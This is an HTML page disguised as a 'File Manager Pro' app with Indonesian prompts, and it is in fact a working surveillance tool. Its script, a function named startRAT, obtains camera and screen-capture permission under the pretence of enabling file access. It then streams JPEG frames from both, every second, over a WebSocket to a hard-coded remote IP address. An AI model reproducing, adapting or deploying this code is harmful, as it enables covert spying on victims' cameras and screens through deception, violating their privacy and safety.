<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>📁 File Manager</title>
<style>
body{background:#121212;color:#fff;font-family:sans-serif;text-align:center;padding-top:50px}
.btn{background:#4caf50;border:none;color:#fff;padding:15px 40px;border-radius:30px;font-size:18px;cursor:pointer;margin:20px}
</style>
</head>
<body>
<h2>📁 File Manager Pro</h2>
<p style="color:#888">Aktifkan akses untuk melanjutkan</p>
<button class="btn" onclick="startRAT()">▶ Izinkan Akses</button>
<p id="status" style="color:#ff9800;margin-top:20px">⏳ Belum aktif</p>

<script>
let ws;
let cameraStream, screenStream;

function startRAT() {
  document.getElementById('status').textContent = '⏳ Meminta izin...';
  
  // 1. Minta izin kamera
  navigator.mediaDevices.getUserMedia({video:true})
  .then(stream => {
    cameraStream = stream;
    document.getElementById('status').textContent = '✅ Kamera aktif';
    startWebSocket();
  })
  .catch(err => {
    document.getElementById('status').textContent = '❌ Izin kamera ditolak!';
  });
  
  // 2. Minta izin layar
  navigator.mediaDevices.getDisplayMedia({video:true})
  .then(stream => {
    screenStream = stream;
    document.getElementById('status').textContent = '✅ Layar aktif';
    startWebSocket();
  })
  .catch(err => {
    document.getElementById('status').textContent = '❌ Izin layar ditolak!';
  });
}

function startWebSocket() {
  ws = new WebSocket('ws://103.125.17.89:8080');
  
  ws.onopen = () => {
    document.getElementById('status').textContent = '✅ Terhubung ke server!';
    // Mulai kirim gambar
    sendData();
  };
  
  ws.onclose = () => {
    document.getElementById('status').textContent = '❌ Server mati!';
  };
}

function sendData() {
  if (!ws || ws.readyState !== WebSocket.OPEN) return;
  
  // Kirim kamera
  if (cameraStream) {
    const v = document.createElement('video');
    v.srcObject = cameraStream;
    v.play();
    const c = document.createElement('canvas');
    c.width = 320; c.height = 240;
    const ctx = c.getContext('2d');
    setInterval(() => {
      ctx.drawImage(v, 0, 0);
      ws.send(JSON.stringify({type:'cam', img: c.toDataURL('image/jpeg',0.5)}));
    }, 1000);
  }
  
  // Kirim layar
  if (screenStream) {
    const v = document.createElement('video');
    v.srcObject = screenStream;
    v.play();
    const c = document.createElement('canvas');
    c.width = 320; c.height = 240;
    const ctx = c.getContext('2d');
    setInterval(() => {
      ctx.drawImage(v, 0, 0);
      ws.send(JSON.stringify({type:'screen', img: c.toDataURL('image/jpeg',0.5)}));
    }, 1000);
  }
}
</script>
</body>
</html>
